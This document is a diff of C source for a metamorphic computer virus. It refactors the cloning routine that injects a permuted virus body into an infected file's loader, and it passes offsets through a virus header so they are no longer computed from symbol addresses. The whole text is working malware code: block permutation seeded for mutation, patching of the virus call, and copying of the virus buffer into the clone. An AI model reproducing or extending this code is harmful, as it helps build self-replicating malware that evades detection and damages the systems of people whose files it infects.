@@ -19,9 +19,8 @@
 /* ---------------------------------- init ---------------------------------- */
 
 static bool	init_loader_safe(struct safe_ptr *loader_ref, \
-			struct safe_ptr clone_ref, size_t loader_off)
+			struct safe_ptr clone_ref, size_t loader_off, size_t loader_size)
 {
-	size_t	loader_size   = (size_t)loader_exit - (size_t)loader_entry;
 	void	*clone_loader = safe(clone_ref, loader_off, loader_size);
 
 	if (!clone_loader) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
@@ -34,9 +33,8 @@ static bool	init_loader_safe(struct safe_ptr *loader_ref, \
 
 static bool	init_virus_safe(struct safe_ptr *virus_ref,           \
 			struct safe_ptr clone_ref, size_t loader_off, \
-			size_t full_virus_size)
+			size_t dist_virus_loader, size_t full_virus_size)
 {
-	size_t	dist_virus_loader = (size_t)virus - (size_t)loader_entry;
 	size_t	virus_off = loader_off + dist_virus_loader;
 
 	size_t	virus_size = full_virus_size - dist_virus_loader;
@@ -51,9 +49,9 @@ static bool	init_virus_safe(struct safe_ptr *virus_ref,           \
 }
 
 static bool	init_virus_buffer_safe(struct safe_ptr *virus_buffer_ref, \
-			size_t loader_off, size_t clone_size)
+			size_t loader_off,                                \
+			size_t dist_virus_loader, size_t clone_size)
 {
-	size_t	dist_virus_loader = (size_t)virus - (size_t)loader_entry;
 	size_t	virus_off = loader_off + dist_virus_loader;
 
 	size_t	available_size = clone_size - virus_off;
@@ -69,9 +67,8 @@ static bool	init_virus_buffer_safe(struct safe_ptr *virus_buffer_ref, \
 }
 
 static bool	get_clone_virus_address(void **clone_virus_address,
-			struct safe_ptr clone_ref, size_t loader_off)
+			struct safe_ptr clone_ref, size_t loader_off, size_t dist_vircall_loader)
 {
-	size_t	dist_vircall_loader = (size_t)call_virus - (size_t)loader_entry;
 	size_t	vircall_off = loader_off + dist_vircall_loader;
 	void	*clone_vircall = safe(clone_ref, vircall_off, CALL32_INST_SIZE);
 
@@ -93,9 +90,9 @@ static inline bool	set_virus_buffer_size(size_t *virus_buffer_size, \
 }
 
 static bool	set_clone_virus_call(struct safe_ptr clone_ref, \
-			size_t loader_off, int32_t clone_virus_address_shift)
+			size_t loader_off, size_t dist_vircall_loader, \
+			int32_t clone_virus_address_shift)
 {
-	size_t	dist_vircall_loader = (size_t)call_virus - (size_t)loader_entry;
 	size_t	vircall_off = loader_off + dist_vircall_loader;
 	void	*clone_vircall = safe(clone_ref, vircall_off, CALL32_INST_SIZE);
 
@@ -109,10 +106,9 @@ static bool	set_clone_virus_call(struct safe_ptr clone_ref, \
 }
 
 static bool	copy_virus_buffer_to_clone(struct safe_ptr clone_ref, \
-			size_t loader_off,                            \
+			size_t loader_off, size_t dist_virus_loader,  \
 			struct safe_ptr virus_buffer_ref, size_t virus_buffer_size)
 {
-	size_t	dist_virus_loader = (size_t)virus - (size_t)loader_entry;
 	size_t	virus_off = loader_off + dist_virus_loader;
 
 	void	*clone_virus = safe(clone_ref, virus_off, virus_buffer_size);
@@ -133,25 +129,29 @@ static bool	set_full_virus_size(size_t *full_virus_size, \
 
 /* ---------------------------- metamorph_clone ----------------------------- */
 
-bool		metamorph_clone(struct safe_ptr clone_ref, \
-			size_t *full_virus_size, size_t loader_off, uint64_t seed)
+bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off, \
+			uint64_t seed, size_t *full_virus_size,               \
+			const struct virus_header *vhdr)
 {
 	struct safe_ptr	loader_ref;
 	struct safe_ptr	virus_ref;
 	struct safe_ptr	virus_buffer_ref;
-	void		*clone_virus_address;
 	size_t		virus_buffer_size;
+	void		*clone_virus_address;
 	int32_t		clone_virus_address_shift = 0;
+	size_t		loader_size         = vhdr->loader_size;
+	size_t		dist_virus_loader   = vhdr->dist_virus_loader;
+	size_t		dist_vircall_loader = vhdr->dist_vircall_loader;
 
-	if (!init_loader_safe(&loader_ref, clone_ref, loader_off)
-	|| !init_virus_safe(&virus_ref, clone_ref, loader_off, *full_virus_size)
-	|| !init_virus_buffer_safe(&virus_buffer_ref, loader_off, clone_ref.size)
-	|| !get_clone_virus_address(&clone_virus_address, clone_ref, loader_off)
+	if (!init_loader_safe(&loader_ref, clone_ref, loader_off, loader_size)
+	|| !init_virus_safe(&virus_ref, clone_ref, loader_off, dist_virus_loader, *full_virus_size)
+	|| !init_virus_buffer_safe(&virus_buffer_ref, loader_off, dist_virus_loader, clone_ref.size)
+	|| !get_clone_virus_address(&clone_virus_address, clone_ref, loader_off, dist_vircall_loader)
 	|| !set_virus_buffer_size(&virus_buffer_size, virus_ref.size)
-	|| !permutate_registers(loader_ref, seed)
+	// || !permutate_registers(loader_ref, seed)
 	|| !permutate_blocks(virus_ref, virus_buffer_ref, &virus_buffer_size, clone_virus_address, &clone_virus_address_shift, seed)
-	|| !set_clone_virus_call(clone_ref, loader_off, clone_virus_address_shift)
-	|| !copy_virus_buffer_to_clone(clone_ref, loader_off, virus_buffer_ref, virus_buffer_size)
+	|| !set_clone_virus_call(clone_ref, loader_off, dist_vircall_loader, clone_virus_address_shift)
+	|| !copy_virus_buffer_to_clone(clone_ref, loader_off, dist_virus_loader, virus_buffer_ref, virus_buffer_size)
 	|| !set_full_virus_size(full_virus_size, virus_buffer_size, virus_ref.size)
 	|| !true)
 	{
